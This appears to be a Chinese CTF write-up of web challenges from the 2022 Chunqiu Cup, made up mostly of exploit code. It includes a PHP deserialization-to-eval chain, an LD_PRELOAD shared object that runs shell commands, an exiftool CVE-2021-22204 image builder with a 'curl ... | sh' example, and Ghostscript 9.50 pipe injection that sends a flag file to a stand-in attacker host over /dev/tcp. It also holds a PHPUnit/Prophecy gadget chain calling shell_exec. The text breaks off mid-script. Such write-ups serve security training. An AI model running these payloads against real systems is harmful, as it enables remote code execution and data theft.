+<h1 id="http-127-0-0-1-poc-php-cmd-phpinfo-args-1"><a href="#http-127-0-0-1-poc-php-cmd-phpinfo-args-1" class="headerlink" title="http://127.0.0.1/poc.php?cmd=phpinfo&amp;args=-1"></a><a target="_blank" rel="noopener" href="http://127.0.0.1/poc.php?cmd=phpinfo&args=-1">http://127.0.0.1/poc.php?cmd=phpinfo&amp;args=-1</a></h1><p>在phpinfo发现添加了ctf模块</p>
+<p>查看php.ini寻找插件名称</p>
+<p>根据插件目录&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;no-debug-non-zts-20190902读取php模块</p>
+<p>下载so</p>
+<p>随后使用ida反编译搜索关键字ctf找到对应反序列化函数 发现__destruct函数存在恶意操作</p>
+<p>条件为md5相等且字符串不相等 基础的数组绕过就好  绕过后发现获取cmd和args参数并传给zephir_call_class_method_aparams函数</p>
+<p>该函数调用了当前类的call_back方法</p>
+<p>跟进call_back方法发现对传入的数据进行了提取</p>
+<p>如果输入的cmd长度小于12则进行变量调用$cmd($args)</p>
+<p>否则把args解码后放入create_function</p>
+<p>结合前面发现的disable_function 和ope_basedir直接LDPRELOAD绕过</p>
+<p>编写poc 恶意类 任意代码执行</p>
+<?php
+namespace Ctf{
+    class Treeting{
+        private $token;
+        private $key;
+        private $cmd;
+        private $args;
+        function __construct(){
+            $this->token = array(1);
+            $this->key = array(2);
+            $this->cmd = "var_dumpvar_dump";
+            $this->args = base64_encode('2;}eval($_GET[0]);/*');
+        }
+    }
+}
+
+namespace{
+    $a = new CtfTreeting();
+    $poc =  serialize($a);
+    $poc = str_replace("T","G",$poc);
+    echo urlencode($poc);
+    // unserialize($poc);
+}
+# O%3A12%3A%22Ctf%5CGreeting%22%3A4%3A%7Bs%3A19%3A%22%00Ctf%5CGreeting%00token%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A1%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00key%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00cmd%22%3Bs%3A16%3A%22var_dumpvar_dump%22%3Bs%3A18%3A%22%00Ctf%5CGreeting%00args%22%3Bs%3A28%3A%22Mjt9ZXZhbCgkX0dFVFswXSk7Lyo%3D%22%3B%7D
+
+因为没有ban掉putenv和mail 所以我们直接执行命令把flag写到tmp下读出来
+
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include 
+#include <sys/types.h>
+
+__attribute__ ((__constructor__)) void angel (void){
+    unsetenv("LD_PRELOAD");
+ const char* cmdline = getenv("CMD");
+ system(cmdline);
+}
+
+<?php
+function request_by_curl($remote_server, $post_string) {
+  $ch = curl_init();
+  curl_setopt($ch, CURLOPT_URL, $remote_server);
+  curl_setopt($ch, CURLOPT_POSTFIELDS, $post_string);
+  curl_setopt($ch, CURLOPT_USERAGENT, "");
+  $data = curl_exec($ch);
+  curl_close($ch);
+}
+
+function go($func,$args){
+  return pack("lllllla*a*", 0, 0, 0, 0, strlen($func), strlen($args), $func, $args);
+}
+// $poc = <<< EOF
+// copy("http://20.1.1.189:
+999/1.so","/tmp/1");putenv("CMD=/readflag>/flag");putenv("LD_PRELOAD=/tmp/1");mail("","","","","");readfile('/tmp/flag');
+// EOF;
+$poc = <<< EOF
+putenv("CMD=/readflag>/tmp/flag");putenv("LD_PRELOAD=/tmp/1");mail("","","","","");include('/tmp/flag');
+EOF;
+
+request_by_curl('http://127.0.0.1:
+888/index.php'.'?0='.$poc, go($_GET['cmd'],$_GET['args']));
+?>
+
+<p>发送数据包</p>
+<p>GET &#x2F;poc.php?cmd&#x3D;unserialize&amp;args&#x3D;O%3A12%3A%22Ctf%5CGreeting%22%3A4%3A%7Bs%3A19%3A%22%00Ctf%5CGreeting%00token%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A1%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00key%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00cmd%22%3Bs%3A16%3A%22var_dumpvar_dump%22%3Bs%3A18%3A%22%00Ctf%5CGreeting%00args%22%3Bs%3A28%3A%22Mjt9ZXZhbCgkX0dFVFswXSk7Lyo%3D%22%3B%7D HTTP&#x2F;1.1<br>Host: 0.0.0.0:<br>800<br>User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko&#x2F;20100101 Firefox&#x2F;99.0<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8<br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Cookie: tracy-session&#x3D;436e349820; _nss&#x3D;1; PHPSESSID&#x3D;3jn67ujcvbcurso8cli2grh670<br>Upgrade-Insecure-Requests: 1<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 0</p>
+<p>picture_convert_plus</p>
+<p>题目给了源码，可以看到 exiftool 的版本是 12.23，也就是存在CVE-2021-22204</p>
+<p>直接搜索这个cve生成一个poc后，发现里面是存在字符串 metadata 的</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/bilkoh/POC-CVE-2021-22204/blob/main/build_image.pl">https://github.com/bilkoh/POC-CVE-2021-22204/blob/main/build_image.pl</a></p>
+<p>然后查看相关的漏洞源码，可以看到进入漏洞触发点的正则除了metadata，还有xmp可以利用，详细分析可以参考<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/266606">https://www.anquanke.com/post/id/266606</a></p>
+<p>修改构造脚本为:</p>
+<p>#!&#x2F;usr&#x2F;bin&#x2F;perl<br>use strict;<br>use warnings;</p>
+<p>my $poc_imgfile &#x3D; ‘notevil.jpg’;<br>my $outfile &#x3D; ‘ant.out’;<br>my $djvumake &#x3D; “djvumake $poc_imgfile INFO&#x3D;0,0 BGjp&#x3D;&#x2F;dev&#x2F;null ANTa&#x3D;$outfile”;</p>
+<p>sub usage {<br>    print “POC-CVE-2021-22204n”;<br>    print “Usage $0 <cmd to inject> n”;<br>    print “tNote: if your cmd contains unix special characters use quote!n”;<br>    print “tEG: $0 “curl xxxx.com&#x2F;script.sh|sh”n”;<br>    print “This poc generates an image file ($poc_imgfile) to be proccessed by vulnerable exiftool.n”;<br>    print “And requires DjVuLibre to be installed and in PATHn”;<br>    print “t See: <a target="_blank" rel="noopener" href="http://djvu.sourceforge.net/n">http://djvu.sourceforge.net/n</a>“;<br>    print “—nn”;<br>}</p>
+<p>sub main {<br>    # search args for cmd to inject<br>    my $args &#x3D; join(‘ ‘, @ARGV);<br>    my $cmd &#x3D; $args || ‘curl <a target="_blank" rel="noopener" href="http://google.com/">http://google.com</a>‘;</p>
+<p>    print “[+] Preparing annotation file.n”;<br>    open(FH, ‘&gt;’, $outfile) or die $!;<br>    while (<DATA>) {<br>        s&#x2F;##&#x2F;$cmd&#x2F;;<br>        print FH $_;<br>    }<br>    close(FH);</p>
+<p>    print “[+] Creating image file with: $djvumake n”;<br>    system($djvumake);</p>
+<p>    # remove file<br>    unlink $outfile;</p>
+<p>    print “[+] $poc_imgfile created.n”;<br>}</p>
+<p>usage();<br>main();</p>
+<p><strong>DATA</strong><br>(xmp”<br>“.<code>/bin/bash -c &#39;##&#39;</code>;#”</p>
+<p>反弹shell后，读取第一部分flag，然后在查看gs的版本，所以利用GPL Ghostscript 9.50(CVE-2021-3781)的漏洞</p>
+<p>CVE-2021-3781的利用脚本，但是过滤了tmp和&amp;#也就不能直接利用了</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/duc-nt/RCE-0-day-for-GhostScript-9.50/blob/main/IM-RCE-via-GhostScript-9.5.py">https://github.com/duc-nt/RCE-0-day-for-GhostScript-9.50/blob/main/IM-RCE-via-GhostScript-9.5.py</a></p>
+<p>这个时候下载相应版本的代码，代码审计后发现绕过方式有两种，第一种处理部分绕过的具体代码如下，他遇到 时会判断后面字符是否可以转义或者是8进制字符串，不然就省略符号</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ArtifexSoftware/ghostpdl/archive/refs/tags/ghostscript-9.50.zip">https://github.com/ArtifexSoftware/ghostpdl/archive/refs/tags/ghostscript-9.50.zip</a></p>
+<p>第二种利用根据源码分析一下，这里就是主要处理pipe的代码块</p>
+<p>最终会进入的路径的匹配逻辑，如果匹配成功，那就可以执行popen</p>
+<p>但是为什么要是&#x2F;tmp&#x2F;开头呢？从下面的代码可以知道，比如一个&#x2F;tmp&#x2F;<em>就代表通配符了主要是&#x2F;tmp&#x2F;开头的都可以进入匹配，如果是</em>的就会进入一些字符限制的匹配，所以目标就是找一下哪些匹配路径里面有*</p>
+<p>这种格式一看就是通过偏移取的值，所以rax就是整个字符串数组的指针，然后挨着遍历一下所有的字符串</p>
+<p>可以发现很多的路径里面都有*，所以我们可以通过其他的路径构造进行绕过copies (%pipe%%rom%lib&#x2F;curl <a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a>:<br>2333&#x2F;) (r) file showpage 0 quit，发现可以成功打通</p>
+<p>最终构造得到第二部分的poc：</p>
+<p>import requests</p>
+<p>url &#x3D; “<a target="_blank" rel="noopener" href="http://eci-/???.cloudeci1.ichunqiu.com">http://eci-???.cloudeci1.ichunqiu.com</a>:<br>8888&#x2F;“<br>convert_url &#x3D; “&#x2F;convert”<br>hack_ip &#x3D; “vps_ip”<br>res &#x3D; requests.session()</p>
+<p>get_flag2&#x3D;f”””<?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <hui><desc>copies (%pipe%&#x2F;temp&#x2F;;bash -c ‘cat &#x2F;flag2 &gt; &#x2F;dev&#x2F;tcp&#x2F;{hack_ip}&#x2F;2333’) (r) file showpage 0 quit </desc>  <svg width="1px" height="1px" /> </hui>“””<br>res.post(url+”&#x2F;upload”,files&#x3D;{“file”:<br>get_flag2})<br>res.get(url+convert_url)</p>
+<p>晋升之路</p>
+<p>打开题目发现storge.js,得到所有的请求方法</p>
+<p>发现cookie使用jwt</p>
+<p>GAME福利</p>
+<p>为了让更多选手可以回味本次比赛的精彩过程，持续学习和训练，春秋GAME团队将春秋杯春季赛题目部署到i春秋CTF大本营的“2022年春秋杯网络安全联赛春季赛”，欢迎各位师傅交流讨论。<br><a target="_blank" rel="noopener" href="https://www.ichunqiu.com/competition">https://www.ichunqiu.com/competition</a></p>
+<p>相关阅读</p>
+<p>2022年春秋杯春季赛落幕，伽玛号战舰将奔赴下一星宇！</p>
+<p>春秋GAME伽玛实验室</p>
+<p>会定期分享赛题赛制设计、解题思路……</p>
+<p>如果你日常有一些技术研究和好的设计思路</p>
+<p>或在赛后对某道题有另辟蹊径的想法</p>
+<p>欢迎找到春秋GAME投稿哦～</p>
+<p>联系vx:<br>cium0309</p>
+<p>欢迎加入 春秋GAME CTF交流2群</p>
+<p>Q群:<br>703460426</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br></pre></td><td class="code"><pre><span class="line">class Redis extends EasySwooleRedisRedis&#123;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        parent::</span><br><span class="line">__construct(new EasySwooleRedisConfigRedisConfig([</span><br><span class="line">            &#x27;host&#x27; =&gt; &#x27;redis&#x27;,</span><br><span class="line">            &#x27;port&#x27; =&gt; &#x27;6379&#x27;,</span><br><span class="line">            &#x27;auth&#x27; =&gt; &#x27;123456&#x27;,</span><br><span class="line">            &#x27;serialize&#x27; =&gt; EasySwooleRedisConfigRedisConfig::</span><br><span class="line">SERIALIZE_PHP</span><br><span class="line">        ]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">private static function make_request($url)</span><br><span class="line">&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">    curl_setopt($ch, CURLOPT_TIMEOUT, 2);</span><br><span class="line">    $output = curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">    return $output;</span><br><span class="line">&#125;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace EasySwooleHttpMessage&#123;</span><br><span class="line">    class UploadFile&#123;</span><br><span class="line">        public $stream;</span><br><span class="line">        function __construct($stream)&#123;</span><br><span class="line">            $this-&gt;stream = $stream;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace ProphecyProphecy&#123;</span><br><span class="line">    class ObjectProphecy&#123;</span><br><span class="line">        public $lazyDouble;</span><br><span class="line">        public $revealer;</span><br><span class="line">        function __construct($lazyDouble)&#123;</span><br><span class="line">            $this-&gt;revealer = $this;</span><br><span class="line">            $this-&gt;lazyDouble = $lazyDouble;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace ProphecyDoubler&#123;</span><br><span class="line">    class LazyDouble&#123;</span><br><span class="line">        public $doubler;</span><br><span class="line">        public $argument;</span><br><span class="line">        public $class;</span><br><span class="line">        public $interfaces;</span><br><span class="line">        function __construct($doubler)&#123;</span><br><span class="line">            $this-&gt;doubler = $doubler;</span><br><span class="line">            $this-&gt;class = null;</span><br><span class="line">            $this-&gt;argument = [];</span><br><span class="line">            $this-&gt;interfaces = [];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Doubler&#123;</span><br><span class="line">        public $mirror;</span><br><span class="line">        public $creator;</span><br><span class="line">        public $namer;</span><br><span class="line">        public $patches;</span><br><span class="line">        function __construct($creator)&#123;</span><br><span class="line">            $this-&gt;namer = new NameGenerator();</span><br><span class="line">            $this-&gt;mirror = new ProphecyDoublerGeneratorClassMirror();</span><br><span class="line">            $this-&gt;creator = $creator;</span><br><span class="line">            $this-&gt;patches = [];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class NameGenerator&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace ProphecyDoublerGenerator&#123;</span><br><span class="line">    class ClassMirror&#123;&#125;</span><br><span class="line">    class ClassCreator&#123;</span><br><span class="line">        public $generator;</span><br><span class="line">        function __construct($generator)&#123;</span><br><span class="line">            $this-&gt;generator = $generator;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace PHPUnitFrameworkMockObject&#123;</span><br><span class="line">    class MockTrait&#123;</span><br><span class="line">        public $classCode;</span><br><span class="line">        public $mockName;</span><br><span class="line">        function __construct($code)&#123;</span><br><span class="line">            $this-&gt;mockName = &quot;&quot;;</span><br><span class="line">            $this-&gt;classCode = $code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $mockObject = new PHPUnitFrameworkMockObjectMockTrait(&#x27;throw new ErrorException(shell_exec(&quot;/readflag&quot;));&#x27;);</span><br><span class="line">    $classCreator = new ProphecyDoublerGeneratorClassCreator($mockObject);</span><br><span class="line">    $doubler = new ProphecyDoublerDoubler($classCreator);</span><br><span class="line">    $lazyDouble = new ProphecyDoublerLazyDouble($doubler);</span><br><span class="line">    $objectProphecy = new ProphecyProphecyObjectProphecy($lazyDouble);</span><br><span class="line">    $message = new EasySwooleHttpMessageUploadFile($objectProphecy);</span><br><span class="line">    echo base64_encode(serialize($message));</span><br><span class="line">&#125;</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &lt; 2:</span><br><span class="line">    print(sys.argv[0]+&quot; target-ip:</span><br><span class="line">port&quot;)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">url = &quot;http://&quot;+sys.argv[1]+&quot;/crawler&quot;</span><br><span class="line">data = 